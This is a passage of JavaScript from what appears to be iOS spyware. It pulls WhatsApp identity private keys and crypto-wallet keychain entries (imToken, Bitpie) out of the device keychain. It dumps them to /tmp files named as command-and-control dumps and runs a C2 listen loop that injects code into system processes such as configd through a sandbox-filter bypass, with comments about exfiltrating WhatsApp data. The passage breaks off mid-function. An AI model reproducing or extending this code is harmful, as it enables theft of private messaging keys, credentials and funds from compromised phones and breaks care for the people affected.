							try { p7_secRC.destroy(); } catch (_) {}
							p7_secRC = null;
							p7_aksReady = false;
							p7_result.diagnostics.secq4aDestroyed = true;
						}
						st.phase = "post_4b";
						p7_flog("=== [4b] assemble identity / wallets / dump (no securityd) ===");

						// --- WA identity extract (RC already gone) ---
						try {
							var p7_waItems = [];
							if (p7_result.tables.genp && p7_result.tables.genp.items)
								p7_waItems = p7_result.tables.genp.items;
							var p7_waIdent = { source: "p7_keychain", items: p7_waItems.length, identity: {}, notes: [] };
							function p7_hexToU8(hx) {
								if (!hx || typeof hx !== "string") return null;
								var out = new Uint8Array(hx.length >> 1);
								for (var i = 0; i < out.length; i++) out[i] = parseInt(hx.substr(i * 2, 2), 16);
								return out;
							}
							function p7_pbField(buf, want) {
								var u = buf instanceof Uint8Array ? buf : new Uint8Array(buf);
								var i = 0;
								while (i < u.length) {
									var tag = 0, shift = 0, b;
									do { b = u[i++]; tag |= (b & 0x7f) << shift; shift += 7; } while (b & 0x80 && i < u.length);
									var fn = tag >> 3, wt = tag & 7;
									if (wt === 0) { do { b = u[i++]; } while (b & 0x80 && i < u.length); }
									else if (wt === 2) {
										var ln = 0; shift = 0;
										do { b = u[i++]; ln |= (b & 0x7f) << shift; shift += 7; } while (b & 0x80 && i < u.length);
										if (fn === want) return u.slice(i, i + ln);
										i += ln;
									} else break;
								}
								return null;
							}
							for (var p7_wi2 = 0; p7_wi2 < p7_waItems.length; p7_wi2++) {
								var p7_it = p7_waItems[p7_wi2];
								var p7_sv = String(p7_it.service || "").toLowerCase();
								var p7_ac = String(p7_it.account || "").toLowerCase();
								var p7_hx = p7_it.dataHex || "";
								var p7_raw = p7_hexToU8(p7_hx);
								if (!p7_raw) continue;
								if (p7_sv === "identity" && (p7_ac.indexOf("public") >= 0)) {
									p7_waIdent.identity.hexPublic = p7_hx;
									p7_waIdent.notes.push("identity/public rowid=" + p7_it.rowid + " len=" + p7_raw.length);
								} else if (p7_sv === "identity") {
									p7_waIdent.identity.hexPrivate = p7_hx.slice(0, 64);
									p7_waIdent.notes.push("identity/priv rowid=" + p7_it.rowid + " len=" + p7_raw.length);
								} else if (p7_sv === "axolotl") {
									var p7_f1 = p7_pbField(p7_raw, 1);
									var p7_f2 = p7_pbField(p7_raw, 2);
									p7_waIdent.notes.push("Axolotl rowid=" + p7_it.rowid + " f1=" + (p7_f1 ? p7_f1.length : 0) + " f2=" + (p7_f2 ? p7_f2.length : 0));
									if (p7_f1 && p7_f1.length === 33 && !p7_waIdent.identity.hexPublic) {
										var p7_ph = ""; for (var p7_j = 0; p7_j < 33; p7_j++) p7_ph += ("0" + p7_f1[p7_j].toString(16)).slice(-2);
										p7_waIdent.identity.hexPublic = p7_ph;
									}
									if (p7_f2 && p7_f2.length === 32 && !p7_waIdent.identity.hexPrivate) {
										var p7_pv = ""; for (var p7_j2 = 0; p7_j2 < 32; p7_j2++) p7_pv += ("0" + p7_f2[p7_j2].toString(16)).slice(-2);
										p7_waIdent.identity.hexPrivate = p7_pv;
									}
								} else {
									p7_waIdent.notes.push("other svce=" + p7_sv + " acct=" + p7_ac + " len=" + p7_raw.length + " rowid=" + p7_it.rowid);
								}
							}
							if (p7_waIdent.identity.hexPrivate || p7_waIdent.identity.hexPublic) {
								p7_waIdent.identity.id = 1;
								p7_waIdent.identity.registration_id = 0;
								p7_waIdent.identity.timestamp = 0;
								p7_waIdent.identity.next_prekey_id = 0;
							}
							p7_result.whatsappIdentity = p7_waIdent;
							var p7_waStr = JSON.stringify(p7_waIdent);
							var p7_waFd = Number(N.callSymbol("open", "/tmp/wa_identity.json.tmp", 0x601, 0x1FF));
							if (p7_waFd >= 0) {
								var p7_waBuf = BigInt(N.callSymbol("malloc", BigInt(p7_waStr.length + 1)));
								N.writeString(p7_waBuf, p7_waStr);
								N.callSymbol("write", p7_waFd, p7_waBuf, p7_waStr.length);
								N.callSymbol("close", p7_waFd);
								N.callSymbol("free", p7_waBuf);
								N.callSymbol("unlink", "/tmp/wa_identity.json");
								N.callSymbol("rename", "/tmp/wa_identity.json.tmp", "/tmp/wa_identity.json");
								N.callSymbol("chmod", "/tmp/wa_identity.json", 0x1FF);
								p7_flog("wa_identity written EARLY (" + p7_waStr.length + "B) priv=" + !!(p7_waIdent.identity.hexPrivate) + " pub=" + !!(p7_waIdent.identity.hexPublic));
								p7_result.diagnostics.waIdentityEarly = true;
							}
						} catch (p7_waErr) {
							p7_flog("wa identity extract err: " + p7_waErr);
						}

						// --- Wallet scan ---
						var p7_wallets = {};
						for (var p7_ri = 0; p7_ri < p7_walletRules.length; p7_ri++)
							p7_wallets[p7_walletRules[p7_ri][0]] = [];
						for (var p7_wti = 0; p7_wti < p7_tableNames.length; p7_wti++) {
							var p7_wTbl = p7_result.tables[p7_tableNames[p7_wti]];
							if (!p7_wTbl || !p7_wTbl.items) continue;
							for (var p7_wi = 0; p7_wi < p7_wTbl.items.length; p7_wi++) {
								var p7_wItem = p7_wTbl.items[p7_wi];
								if (p7_wItem.error) continue;
								var p7_agrp = (p7_wItem.accessGroup || "").toLowerCase();
								var p7_svce = (p7_wItem.service || "").toLowerCase();
								for (var p7_ri = 0; p7_ri < p7_walletRules.length; p7_ri++) {
									var p7_pats = p7_walletRules[p7_ri][1];
									var p7_hit = false;
									for (var p7_pi = 0; p7_pi < p7_pats.length; p7_pi++) {
										if (p7_agrp.indexOf(p7_pats[p7_pi]) >= 0 || p7_svce.indexOf(p7_pats[p7_pi]) >= 0) {
											p7_hit = true; break;
										}
									}
									if (p7_hit) { p7_wallets[p7_walletRules[p7_ri][0]].push(p7_wItem); break; }
								}
							}
						}
						p7_result.wallets = {};
						var p7_wlog = "wallets:";
						for (var p7_ri = 0; p7_ri < p7_walletRules.length; p7_ri++) {
							var p7_wk = p7_walletRules[p7_ri][0];
							if (p7_wallets[p7_wk].length > 0) {
								p7_result.wallets[p7_wk] = {count: p7_wallets[p7_wk].length, items: p7_wallets[p7_wk]};
								p7_wlog += " " + p7_wk + "=" + p7_wallets[p7_wk].length;
							}
						}
						p7_flog(p7_wlog);

						// Side files for wallet consumers (imToken / Bitpie - old_pe layout).
						function p7_writeWalletSlice(fname, key, payload) {
							try {
								if (!payload) return;
								var slice = JSON.stringify({ source: "p7", wallets: (function () {
									var o = {}; o[key] = payload; return o;
								})() });
								var tmp = fname + ".tmp";
								var fd = Number(N.callSymbol("open", tmp, 0x601, 0x1FF));
								if (fd < 0) return;
								var buf = BigInt(N.callSymbol("malloc", BigInt(slice.length + 1)));
								N.writeString(buf, slice);
								N.callSymbol("write", fd, buf, slice.length);
								N.callSymbol("close", fd);
								N.callSymbol("free", buf);
								N.callSymbol("unlink", fname);
								N.callSymbol("rename", tmp, fname);
								N.callSymbol("chmod", fname, 0x1FF);
								p7_flog(fname + " slice written (" + slice.length + "B)");
							} catch (se) {
								p7_flog(fname + " slice ERR: " + se);
							}
						}
						if (p7_result.wallets) {
							p7_writeWalletSlice("/tmp/imtoken_keychain.json", "imtoken", p7_result.wallets.imtoken);
							p7_writeWalletSlice("/tmp/bitpie_keychain.json", "bitpie", p7_result.wallets.bitpie);
						}

						// (wa_identity already written EARLY above)

						// --- Write result ---
						N.callSymbol("sqlite3_close", p7_db);
						var p7_jsonStr = JSON.stringify(p7_result);
						var p7_outTmp = "/tmp/keychain_c2_dump.json.tmp";
						var p7_outFinal = "/tmp/keychain_c2_dump.json";
						var p7_outDone = "/tmp/keychain_c2_dump.done";

						var p7_outFd = Number(N.callSymbol("open", p7_outTmp, 0x601, 0x1FF));
						if (p7_outFd >= 0) {
							var p7_jBuf = BigInt(N.callSymbol("malloc", BigInt(p7_jsonStr.length + 1)));
							N.writeString(p7_jBuf, p7_jsonStr);
							N.callSymbol("write", p7_outFd, p7_jBuf, p7_jsonStr.length);
							N.callSymbol("fsync", p7_outFd);
							N.callSymbol("close", p7_outFd);
							N.callSymbol("free", p7_jBuf);
							N.callSymbol("chmod", p7_outTmp, 0x1FF);
							N.callSymbol("unlink", p7_outFinal);
							N.callSymbol("rename", p7_outTmp, p7_outFinal);
							N.callSymbol("chmod", p7_outFinal, 0x1FF);
							// Write done marker
							var p7_doneFd = Number(N.callSymbol("open", p7_outDone, 0x601, 0x1FF));
							if (p7_doneFd >= 0) {
								N.callSymbol("write", p7_doneFd, "done", 4);
								N.callSymbol("close", p7_doneFd);
								N.callSymbol("chmod", p7_outDone, 0x1FF);
							}
							p7_flog("result written to " + p7_outFinal + " (" + p7_jsonStr.length + " bytes)");
						} else {
							p7_flog("failed to open output file");
							p7_result.errors.push("output file open failed");
						}
					} else {
						N.callSymbol("free", p7_dbPtrBuf);
						p7_flog("DB open failed, no sqlite3 pipeline");
						p7_result.errors.push("DB open failed rc=" + p7_dbRc);
					}
				}
			} catch (p7_err) {
				p7_flog("Phase 2 error: " + p7_err);
			} finally {
				if (p7_secRC) {
					p7_secRC.destroy();
				}
			}
		} catch (p7_wrap_err) {
			st.err = String(p7_wrap_err).slice(0, 160);
			LOG("[P7] Phase2 THREW: " + st.err);
			return { ok: false, error: st.err, state: st };
		} finally {
			st.running = false;
			st.ts = Date.now();
		}
		try {
			let N2 = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
			let wfd = N2.callSymbol("fopen", "/tmp/wa_identity.json", "r");
			if (wfd && wfd !== 0 && wfd !== 0n) {
				N2.callSymbol("fclose", wfd);
				st.wa_identity = true;
			}
		} catch (_) {}
		try {
			st.dump = !!(typeof peP7DumpOnDisk === "function" && peP7DumpOnDisk());
			st.classkeys = !!(st.classkeys || (typeof peP7ClassKeysOnDisk === "function" && peP7ClassKeysOnDisk()));
		} catch (_) {}
		st.ready = !!(st.wa_identity && st.dump);
		if (!st.ready && !st.err) st.err = (!st.dump && !st.wa_identity) ? "no_dump_or_identity" :
			(!st.dump ? "no_dump" : "no_wa_identity");
		try {
			peP7CacheSave({
				done: true,
				started: true,
				ok: !!st.ready,
				wa_identity: !!st.wa_identity,
				dump: !!st.dump,
				classkeys: !!st.classkeys,
				error: st.err || "",
				phase: "phase2",
				source: st.source || "",
				rc_attempted: !!st.rc_attempted,
				rc_ok: !!st.rc_ok
			});
		} catch (_) {}
		LOG("[P7] Phase2 done wa=" + !!st.wa_identity + " dump=" + !!st.dump +
			" classkeys=" + !!st.classkeys + " source=" + st.source + " phase=" + (st.phase || ""));
		return {
			ok: !!st.ready,
			reused: false,
			wa_identity: !!st.wa_identity,
			dump: !!st.dump,
			classkeys: !!st.classkeys,
			source: st.source,
			phase: st.phase || "",
			error: st.ready ? "" : (st.err || "no_dump_or_identity"),
			state: st
		};
	};
	if (p7_enableP7) {
		globalThis.__peP7Phase2("cold");
	} else {
		LOG("[PE-WORKER] P7 deferred - use hot p7_warmup after keychain_copier (p7_enableP7=false)");
	}
	// ===== End P7 Phase 2 =====
	if (p7_enableP7) p7_flushLog();

	LOG("[PE-WORKER] start() COMPLETE");
	return true;
}

try {
	LOG("[PE-PROBE-1] calling start() pid=" + fcall(GETPID));
	start();
	LOG("[PE-PROBE-2] start() returned pid=" + fcall(GETPID));
}
catch (error) {
	LOG("[PE] start() threw: " + error);
}
	finally {
	if (globalThis.PE_SKIP_WORKER_EXIT) {
		// E4/D1: pe is T0 worker - stay in listen loop (try/catch per tick; never exit loop).
		let PE_SKIP_BS_INJECT = globalThis.PE_SKIP_BS_INJECT === true;
		let PE_DIRECT_PIPELINE = false; // armed after identity + applist intersect
		globalThis.PE_DIRECT_PIPELINE = false;
		LOG("[PE-DEBUG] PE_SKIP_WORKER_EXIT=true - entering D1 pe listen loop PE_DIRECT=" + PE_DIRECT_PIPELINE);
		let N = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
		let pePid = fcall(GETPID);
		let peHost = "unknown";
		try {
			let pbuf = calloc(1n, 1024n);
			let npath = N.callSymbol("proc_pidpath", pePid, pbuf, 1024n);
			if (npath && npath > 0n) {
				peHost = N.readString(pbuf);
			}
			free(pbuf);
		} catch (hnErr) {
			try {
				let gp = N.callSymbol("getprogname");
				if (gp && gp !== 0n) peHost = N.readString(gp);
			} catch (_) {}
		}
		LOG("[PE-LISTEN] host pid=" + pePid + " path=" + peHost);
		try {
			globalThis.__pe_listen_meta = { pid: Number(pePid), path: String(peHost), tick: 0 };
		} catch (_) {}
		try { N.callSymbol("mkdir", "/tmp/c2_ipc", 0x1ff); } catch (_) {}
		let peDeviceIds = { uuid: "", serial: "", unique: "" };
		try {
			// Re-read cache / pe_pid only - native MG/IOKit from mpd can hang the listen loop.
			// SerialNumber is written by bootstrap (SB) into device.json; refresh each tick below.
			peDeviceIds = peResolveDeviceIds(N, { allowNative: false }) || peDeviceIds;
			if (!peDeviceIds.serial && peDeviceIds.source !== "serial") {
				let ensured = (typeof peEnsurePersistentDeviceId === "function"
					? peEnsurePersistentDeviceId
					: globalThis.peEnsurePersistentDeviceId)(N);
				if (ensured && ensured.uuid) peDeviceIds = ensured;
			}
			LOG("[PE-LISTEN] uuid=" + peDeviceIds.uuid + " peid=" + (peDeviceIds.peid || "") +
				" source=" + peDeviceIds.source);
		} catch (idErr) {
			LOG("[PE-LISTEN] uuid resolve warn: " + idErr);
		}
		function peAdoptAgentIdentity() {
			try {
				let keepFn = (typeof __peKeepPeidOn === "function" ? __peKeepPeidOn : globalThis.__peKeepPeidOn);
				let prevPeid = (peDeviceIds && peDeviceIds.peid) || "";
				let disk = (typeof peReadDeviceJson === "function" ? peReadDeviceJson : globalThis.peReadDeviceJson)();
				if (disk) {
					let rankDisk = (typeof __peIdsRank === "function" ? __peIdsRank : globalThis.__peIdsRank)(disk);
					let rankCur = (typeof __peIdsRank === "function" ? __peIdsRank : globalThis.__peIdsRank)(peDeviceIds);
					if (rankDisk > rankCur) {
						peDeviceIds = disk;
						LOG("[PE-LISTEN] identity upgrade uuid=" + disk.uuid + " source=" + disk.source +
							" from=" + (disk.from || ""));
					}
				}
				if (keepFn) peDeviceIds = keepFn(peDeviceIds || {});
				if (peDeviceIds && !__peValidPeid(peDeviceIds.peid) && __peValidPeid(prevPeid))
					peDeviceIds.peid = prevPeid;
				globalThis.__pe_device_ids = peDeviceIds;
				try {
					let diskPeid = disk && disk.peid ? String(disk.peid) : "";
					if (peDeviceIds && __peValidPeid(peDeviceIds.peid) && diskPeid !== String(peDeviceIds.peid))
						__peWriteFileUtf8(PE_DEVICE_PATH, JSON.stringify(peDeviceIds));
				} catch (_) {}
			} catch (_) {}
			return peDeviceIds;
		}
		function peIdentityReady() {
			try {
				peAdoptAgentIdentity();
				let fn = typeof peIdentityReadyFrom === "function" ? peIdentityReadyFrom : globalThis.peIdentityReadyFrom;
				return !!(fn && fn(peDeviceIds));
			} catch (_) {
				return false;
			}
		}
		function peNeedIdentityCmd(ct) {
			ct = String(ct || "");
			return ct === "pe_load" || ct === "load_module" || ct === "p7_warmup" || ct === "p7_run" ||
				ct === "keychain_copy" || ct === "session_start" || ct === "session_stop" ||
				ct === "read_path" || ct === "session_list";
		}
		function peDeviceUuid() {
			try {
				peAdoptAgentIdentity();
				if (peDeviceIds && peDeviceIds.uuid) return String(peDeviceIds.uuid);
				if (globalThis.__pe_device_ids && globalThis.__pe_device_ids.uuid)
					return String(globalThis.__pe_device_ids.uuid);
			} catch (_) {}
			return "pe-" + Number(pePid);
		}
		try {
			let lk = (typeof __peTryAcquireListenLock === "function"
				? __peTryAcquireListenLock
				: globalThis.__peTryAcquireListenLock)();
			if (lk && lk.ok === false) {
				LOG("[PE-LISTEN] pe.lock held by pid=" + lk.holder + " - skip duplicate listen");
				return;
			}
			if (lk && lk.stole) LOG("[PE-LISTEN] pe.lock stole stale pid=" + lk.stale);
			else LOG("[PE-LISTEN] pe.lock acquired pid=" + pePid);
			globalThis.__pe_listen_loop_active = true;
		} catch (lockErr) {
			LOG("[PE-LISTEN] pe.lock warn: " + lockErr);
			globalThis.__pe_listen_loop_active = true;
		}
		if (!globalThis.__pe_sessions) globalThis.__pe_sessions = {};
		let peTick = 0;
		let peHbEvery = 5; // heartbeat file ~ every 10s if sleep 2s
		let PE_BS_ONLINE_MS = 45000;
		let PE_BS_REINJECT_MS = 180000;
		let PE_BS_COLD_GRACE_MS = 60000; // after cold stub / reinject, do not reinject again
		let PE_LIST_ENSURE_MIN_TICK = 30; // ~60s listen before list_ensure may reinject
		let PE_MODULE_TIMEOUT_MS = 600000;
		// PE-direct session pipeline: P7 RC ~120s + TG/WA eval; must exceed legacy 120s.
		let PE_PIPELINE_TIMEOUT_MS = 1800000; // 30m - large WA LocalKeyValue exfil needs headroom
		/* Soft caps so missing collect files / hung session never blocks sibling modules forever. */
		let PE_WA_COLLECT_SOFT_MS = 180000; // 3m wait for /tmp/wa_auth after eval_ok
		let PE_WA_EXFIL_SOFT_MS = 900000;   // 15m mid-exfil (large LocalKeyValue)
		// Session eval stale/retry - logic hot in pe_session_eval.js (stub in cold pe).
		let PE_SESSION_EVAL_LOADED = false;
		function peSessionEvalEnsure() {
			if (globalThis.__peSessionEval && globalThis.__peSessionEval.ver) {
				PE_SESSION_EVAL_LOADED = true;
				return true;
			}
			try {
				let r = null;
				if (typeof peResolveModule === "function") {
					r = peResolveModule("pe_session_eval.js", { forceNet: false });
				}
				if (r && r.ok && r.src && r.src.indexOf("pe_session_eval omitted") < 0) {
					eval(String(r.src));
					PE_SESSION_EVAL_LOADED = !!(globalThis.__peSessionEval && globalThis.__peSessionEval.ver);
					if (PE_SESSION_EVAL_LOADED) {
						LOG("[PE-LISTEN] pe_session_eval loaded via=" + (r.via || "?"));
					}
				}
			} catch (le) {
				LOG("[PE-LISTEN] pe_session_eval load ERR: " + String(le).slice(0, 80));
			}
			return PE_SESSION_EVAL_LOADED;
		}
		function peSessionEvalCtx() {
			return {
				sessions: globalThis.__pe_sessions,
				log: LOG,
				readUtf8: __peReadFileUtf8,
				readEvalState: peReadEvalState,
				writeEval: peWriteEvalFile,
				writeStatus: peWriteSessionStatus,
				releaseLock: __peInjectLockRelease,
				unlink: function (p) {
					try { N.callSymbol("unlink", String(p)); } catch (_) {}
				},
				requeue: function (job) {
					if (!globalThis.__pe_sess_inj_q) globalThis.__pe_sess_inj_q = [];
					globalThis.__pe_sess_inj_q.push(job);
				}
			};
		}
		// Grace from listen/stub start - never treat unset/0 as elapsed
		if (!globalThis.__pe_last_bs_reinject_ts) globalThis.__pe_last_bs_reinject_ts = Date.now();
		if (!globalThis.__pe_last_list_ensure_ts) globalThis.__pe_last_list_ensure_ts = Date.now();
		if (!globalThis.__pe_cold_stub_ts) globalThis.__pe_cold_stub_ts = globalThis.__pe_last_bs_reinject_ts;
		if (!globalThis.__pe_report_ok_ts) globalThis.__pe_report_ok_ts = 0;
		function peModuleTimeoutSweep() {
			try {
				let m = globalThis.__pe_task_modules || {};
				let keys = Object.keys(m);
				let now = Date.now();
				for (let i = 0; i < keys.length; i++) {
					let mid = keys[i];
					let cur = m[mid];
					if (!cur) continue;
					let st = String(cur.status || "");
					if (st !== "running" && st !== "starting" && st !== "pending") continue;
					let start = Number(cur.start_ts || cur.apply_ts || 0);
					if (!start) continue;
					// Resident agents (bootstrap) never time out; only biz/debug modules do.
					let kind = String(cur.kind || "");
					if (kind === "agent" || mid === "bootstrap") continue;
					let limit = Number(cur.timeout_ms || PE_MODULE_TIMEOUT_MS);
					if (!(limit > 0) || now - start <= limit) continue;
					peTaskSet(mid, {
						status: "timeout",
						note: "timeout_" + limit + "ms",
						end_ts: now
					});
					LOG("[PE-LISTEN] module timeout id=" + mid + " after " + (now - start) + "ms");
					peModulePostResult(mid, "timeout", { elapsed_ms: now - start });
				}
			} catch (_) {}
		}
		function peCmdInflightTimeoutSweep() {
			if (!globalThis.__pe_cmd_inflight) {
				globalThis.__pe_cmd_inflight_ts = 0;
				return;
			}
			let since = Number(globalThis.__pe_cmd_inflight_ts || 0);
			if (!since) {
				globalThis.__pe_cmd_inflight_ts = Date.now();
				return;
			}
			if (Date.now() - since > PE_MODULE_TIMEOUT_MS) {
				LOG("[PE-LISTEN] cmd inflight timeout " + globalThis.__pe_cmd_inflight);
				globalThis.__pe_cmd_inflight = null;
				globalThis.__pe_cmd_inflight_ts = 0;
			}
		}
		function peWriteInventory() {
			try {
				let list = [];
				let sess = globalThis.__pe_sessions || {};
				let keys = Object.keys(sess);
				for (let i = 0; i < keys.length; i++) list.push(sess[keys[i]]);
				let body = JSON.stringify({
					ts: Date.now(),
					uuid: peDeviceUuid(),
					serial: (peDeviceIds && peDeviceIds.serial) || "",
					unique: (peDeviceIds && peDeviceIds.unique) || "",
					pe_pid: Number(pePid),
					pe_uid: "pe-" + Number(pePid),
					sessions: list
				}) + "\n";
				let fd = fopen(get_cstring("/tmp/c2_ipc/pe.inventory"), get_cstring("w"));
				if (fd && fd !== 0n) {
					let buf = get_cstring(body);
					fwrite(buf, 1n, BigInt(body.length), fd);
					fclose(fd);
				}
			} catch (_) {}
		}
		// session_start must NOT block listen: queue inject, ack pe.result immediately, drain on tick.
		if (!globalThis.__pe_sess_inj_q) globalThis.__pe_sess_inj_q = [];
		function peWriteSessionStatus(sid, obj) {
			try {
				let body = JSON.stringify(Object.assign({ ts: Date.now(), session_id: sid }, obj || {})) + "\n";
				let p = "/tmp/c2_ipc/session." + sid + ".status";
				let fd = fopen(get_cstring(p), get_cstring("w"));
				if (fd && fd !== 0n) {
					let buf = get_cstring(body);
					fwrite(buf, 1n, BigInt(body.length), fd);
					fclose(fd);
				}
			} catch (_) {}
		}
		function peWriteEvalFile(sid, obj) {
			try {
				let body = JSON.stringify(Object.assign({ ts: Date.now(), session_id: sid }, obj || {})) + "\n";
				let p = "/tmp/c2_ipc/session." + sid + ".eval";
				let fd = fopen(get_cstring(p), get_cstring("w"));
				if (fd && fd !== 0n) {
					let buf = get_cstring(body);
					fwrite(buf, 1n, BigInt(body.length), fd);
					fclose(fd);
				}
			} catch (_) {}
		}
		function peReadEvalState(sid) {
			try {
				let raw = __peReadFileUtf8("/tmp/c2_ipc/session." + sid + ".eval", 4096);
				if (!raw || raw.length < 8) return null;
				return JSON.parse(raw);
			} catch (_) {
				return null;
			}
		}
		function peWriteEvalIfNotTerminal(sid, obj) {
			try {
				let cur = peReadEvalState(sid);
				if (cur && (cur.state === "eval_ok" || cur.state === "eval_fail" || cur.state === "eval_no_file"))
					return false;
			} catch (_) {}
			peWriteEvalFile(sid, obj);
			return true;
		}
		// Phased session inject: tick N = lock+tokens (return for heartbeat);
		// tick N+1 = InjectJS on reused RemoteCall (avoid 2nd RC into configd - hang/reboot risk).
		let PE_SESS_INJ_PHASE2_MAX_MS = 90000;
		function peInjProgressWrite(obj) {
			try {
				__peWriteFileUtf8(
					"/tmp/c2_ipc/pe.inj.progress",
					JSON.stringify(Object.assign({ ts: Date.now(), pe_pid: Number(pePid) }, obj || {})) + "\n"
				);
			} catch (_) {}
		}
		function peDrainSessionInjFinish(job, injOk, tpid, sErr, injLock) {
			let sid = String(job.sid || "");
			let target = String(job.target || "configd");
			let payloadName = String(job.payload || "probe");
			if (injOk) {
				let prev = globalThis.__pe_sessions[sid] || {};
				let fullCode = String(job.full_code || prev.full_code || (job.phase === "sync_probe" ? prev.full_code : job.code) || "");
				globalThis.__pe_sessions[sid] = Object.assign(prev, {
					id: sid,
					target: target,
					payload: payloadName,
					pid: tpid,
					state: "running",
					eval_pending: true,
					inject_lock: target,
					started: prev.started || Date.now(),
					inject_ts: Date.now(),
					last_progress_ts: Date.now(),
					eval_retry: Number(job.retry || prev.eval_retry || 0),
					full_code: fullCode,
					last_hb_snapshot: ""
				});
				peWriteInventory();
			} else {
				if (injLock && injLock.ok) __peInjectLockRelease(target);
				peWriteSessionStatus(sid, {
					state: "inject_fail",
					ok: false,
					error: sErr || "inject_fail",
					target: target,
					payload: payloadName
				});
				if (globalThis.__pe_sessions[sid]) {
					globalThis.__pe_sessions[sid].eval_pending = false;
					globalThis.__pe_sessions[sid].state = "inject_fail";
				}
			}
			globalThis.__pe_sess_inj_hold = null;
			globalThis.__pe_sess_inj_busy = false;
			peInjProgressWrite({
				phase: injOk ? "done_ok" : "done_fail",
				sid: sid,
				error: sErr || "",
				pid: tpid || 0
			});
		}
		function peDrainSessionInjPhase1(job) {
			let sid = String(job.sid || "");
			let target = String(job.target || "configd");
			let payloadName = String(job.payload || "probe");
			let codePath = "/tmp/c2_ipc/pe_inj." + sid + ".js";
			LOG("[PE-LISTEN] session_inj phase1 id=" + sid + " target=" + target + " len=" + (job.code ? job.code.length : 0));
			peInjProgressWrite({ phase: "phase1_start", sid: sid, target: target, payload: payloadName });
			peWriteSessionStatus(sid, { state: "injecting", target: target, payload: payloadName, code_len: job.code.length });
			let sErr = "";
			let injLock = null;
			let mig = globalThis.__pe_migFilterBypass;
			if (!mig) sErr = "no_mig";
			else {
				injLock = __peInjectLockAcquire(target, "session", { sid: sid, timeoutMs: 180000 });
				if (!injLock || !injLock.ok) {
					sErr = (injLock && injLock.error) ? injLock.error : "lock_fail";
					LOG("[PE-LISTEN] session_inj lock fail target=" + target + " " + sErr);
				}
				if (!sErr) {
					try {
						if (!__peWriteFileUtf8(codePath, job.code)) sErr = "inj_file_write";
					} catch (we) {
						sErr = "inj_file_write:" + String(we).slice(0, 40);
					}
				}
			}
			if (sErr) {
				peWriteEvalFile(sid, { state: "eval_no_file", path: codePath, error: sErr });
				LOG("[PE-LISTEN] session_inj phase1 FAIL " + sErr);
				peDrainSessionInjFinish(job, false, 0, sErr, injLock);
				return;
			}
			// Match keychain: NO pre-tokens RC here. Single RC happens inside InjectJS(string)
			// on phase2 (async), then applyTokens - avoids reuse_rc + syncEval deadlock / no-eval.
			peWriteEvalFile(sid, { state: "eval_start", path: codePath, payload: payloadName, via: "injectjs_kc_order" });
			globalThis.__pe_sess_inj_hold = {
				job: job,
				sid: sid,
				target: target,
				payload: payloadName,
				codePath: codePath,
				injLock: injLock,
				tokRC: null,
				phase1_ts: Date.now(),
				phase: "tokens_done"
			};
			globalThis.__pe_sess_inj_busy = true;
			peInjProgressWrite({ phase: "file_ready", sid: sid, target: target, yield: true });
			peWriteSessionStatus(sid, {
				state: "file_ready",
				target: target,
				payload: payloadName,
				body_len: job.code.length,
				inj_path: codePath
			});
			LOG("[PE-LISTEN] session_inj phase1 file ready - yield for heartbeat (inject next tick)");
		}
		function peDrainSessionInjPhase2(hold) {
			let job = hold.job;
			let sid = hold.sid;
			let target = hold.target;
			let payloadName = hold.payload;
			let codePath = hold.codePath;
			let injLock = hold.injLock;
			let mig = globalThis.__pe_migFilterBypass;
			let injOk = false;
			let tpid = 0;
			let sErr = "";
			peInjProgressWrite({ phase: "phase2_start", sid: sid, target: target, reuse_rc: true });
			// CFG-Q: configd uses singleton RemoteCall; other targets keep string InjectJS.
			// pe-337: tokens BEFORE bg fire on shared RC.
			let wantSync = !!(job && job.sync_eval);
			let isCfg = (String(target || "") === "configd");
			LOG("[PE-LISTEN] session_inj phase2 sid=" + sid +
				" sync=" + wantSync + " cfgq=" + (isCfg ? 1 : 0));
			try {
				if (isCfg) {
					let cfgR = peCfgInject(job.code, {
						purpose: "session:" + payloadName,
						syncEval: wantSync,
						applyTokensBefore: true,
						forceCfString: true
					});
					if (cfgR && cfgR.ok) {
						injOk = true;
						tpid = Number(cfgR.pid) || 0;
						try {
							globalThis.__pe_sess_keep = globalThis.__pe_sess_keep || [];
							if (cfgR.inj) globalThis.__pe_sess_keep.push(cfgR.inj);
						} catch (_) {}
						if (!peWriteEvalIfNotTerminal(sid, {
							state: "eval_injected",
							path: codePath,
							payload: payloadName,
							code_len: job.code.length,
							reuse_rc: !!cfgR.reused,
							cfg_q: true,
							sync_eval: wantSync,
							tokens_before: true,
							force_cfstring: true
						})) {
							LOG("[PE-LISTEN] session eval already terminal sid=" + sid);
						}
						peWriteSessionStatus(sid, {
							state: "running",
							ok: true,
							pid: tpid,
							target: target,
							payload: payloadName,
							eval_pending: true,
							eval_path: "/tmp/c2_ipc/session." + sid + ".eval",
							reuse_rc: !!cfgR.reused,
							cfg_q: true,
							tokens_before: true
						});
						LOG("[PE-LISTEN] session_start CFG-Q OK pid=" + tpid +
							" reused=" + !!cfgR.reused);
					} else {
						sErr = (cfgR && cfgR.error) ? String(cfgR.error) : "cfg_inject_fail";
						peWriteEvalFile(sid, { state: "eval_fail", path: codePath, error: sErr });
						LOG("[PE-LISTEN] session_start CFG-Q FAIL " + sErr);
					}
				} else {
				let useSyncEval = wantSync;
				let sessInj = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](target, job.code, mig, useSyncEval, {
					applyTokensBefore: true,
					skipDiag: true,
					forceCfString: true
				});
				LOG("[PE-LISTEN] session_start injecting len=" + job.code.length +
					" syncEval=" + useSyncEval + " phase=direct_cfstring_tokens_before tokens_before=1");
				peInjProgressWrite({ phase: "phase2_inject", sid: sid });
				if (sessInj.inject()) {
					injOk = true;
					try { tpid = Number(sessInj.task.pid()); } catch (_) { tpid = 0; }
					if (!peWriteEvalIfNotTerminal(sid, {
						state: "eval_injected",
						path: codePath,
						payload: payloadName,
						code_len: job.code.length,
						reuse_rc: false,
						kc_order: true,
						sync_eval: useSyncEval,
						tokens_before: true,
						force_cfstring: true,
						old_pe_bg: !useSyncEval
					})) {
						LOG("[PE-LISTEN] session eval already terminal sid=" + sid);
					}
					peWriteSessionStatus(sid, {
						state: "running",
						ok: true,
						pid: tpid,
						target: target,
						payload: payloadName,
						eval_pending: true,
						eval_path: "/tmp/c2_ipc/session." + sid + ".eval",
						reuse_rc: false,
						kc_order: true,
						tokens_before: true,
						old_pe_bg: !useSyncEval
					});
					LOG("[PE-LISTEN] session_start inject OK pid=" + tpid +
						" cfstring+tokens_before (keep InjectJS)");
					try {
